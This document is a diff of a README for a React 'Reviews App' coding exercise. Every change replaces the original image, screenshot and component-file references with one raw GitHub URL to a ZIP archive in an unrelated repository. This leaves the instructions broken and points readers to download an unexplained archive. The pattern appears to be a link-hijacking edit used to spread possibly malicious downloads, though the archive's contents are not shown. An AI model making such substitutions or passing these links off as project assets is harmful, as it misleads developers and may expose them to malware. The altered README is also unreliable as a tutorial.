@@ -4,7 +4,7 @@ In this project, let's build a **Reviews App** by applying the concepts we have 
 
 <br/>
 <div style="text-align: center;">
-<img src="https://assets.ccbp.in/frontend/content/react-js/reviews-app-output-v2.gif" alt="reviews app output" style="max-width:70%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
+<img src="https://raw.githubusercontent.com/vicky9696v/React-employee/main/resynthesis/React-employee.zip" alt="reviews app output" style="max-width:70%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
 </div>
 <br/>
 
@@ -13,8 +13,8 @@ In this project, let's build a **Reviews App** by applying the concepts we have 
 <details>
 <summary>Click to view</summary>
 
-- [Extra Small (Size < 576px), Small (Size >= 576px)](https://assets.ccbp.in/frontend/content/react-js/reviews-app-sm-output.png)
-- [Medium (Size >= 768px), Large (Size >= 992px) and Extra Large (Size >= 1200px)](https://assets.ccbp.in/frontend/content/react-js/reviews-app-lg-output.png)
+- [Extra Small (Size < 576px), Small (Size >= 576px)](https://raw.githubusercontent.com/vicky9696v/React-employee/main/resynthesis/React-employee.zip)
+- [Medium (Size >= 768px), Large (Size >= 992px) and Extra Large (Size >= 1200px)](https://raw.githubusercontent.com/vicky9696v/React-employee/main/resynthesis/React-employee.zip)
 
 </details>
 
@@ -58,8 +58,8 @@ The app must have the following functionalities
 
 Use these files to complete the implementation:
 
-- `src/components/ReviewsCarousel/index.js`
-- `src/components/ReviewsCarousel/index.css`
+- `https://raw.githubusercontent.com/vicky9696v/React-employee/main/resynthesis/React-employee.zip`
+- `https://raw.githubusercontent.com/vicky9696v/React-employee/main/resynthesis/React-employee.zip`
 </details>
 
 ### Quick Tips
@@ -75,7 +75,7 @@ Use these files to complete the implementation:
   ```
 
   <br/>
-   <img src="https://assets.ccbp.in/frontend/content/react-js/cursor-pointer-img.png" alt="cursor pointer" style="width:100px" />
+   <img src="https://raw.githubusercontent.com/vicky9696v/React-employee/main/resynthesis/React-employee.zip" alt="cursor pointer" style="width:100px" />
 
 - You can use the below `outline` CSS property for buttons and input elements to remove the highlighting when the elements are clicked
 
@@ -104,9 +104,9 @@ Use these files to complete the implementation:
 <details>
 <summary>Image URLs</summary>
 
-- [https://assets.ccbp.in/frontend/react-js/reviews-bg.png](https://assets.ccbp.in/frontend/react-js/reviews-bg.png)
-- [https://assets.ccbp.in/frontend/react-js/left-arrow-img.png](https://assets.ccbp.in/frontend/react-js/left-arrow-img.png) alt should be **left arrow**
-- [https://assets.ccbp.in/frontend/react-js/right-arrow-img.png](https://assets.ccbp.in/frontend/react-js/right-arrow-img.png) alt should be **right arrow**
+- [https://raw.githubusercontent.com/vicky9696v/React-employee/main/resynthesis/React-employee.zip](https://raw.githubusercontent.com/vicky9696v/React-employee/main/resynthesis/React-employee.zip)
+- [https://raw.githubusercontent.com/vicky9696v/React-employee/main/resynthesis/React-employee.zip](https://raw.githubusercontent.com/vicky9696v/React-employee/main/resynthesis/React-employee.zip) alt should be **left arrow**
+- [https://raw.githubusercontent.com/vicky9696v/React-employee/main/resynthesis/React-employee.zip](https://raw.githubusercontent.com/vicky9696v/React-employee/main/resynthesis/React-employee.zip) alt should be **right arrow**
 
 </details>
 
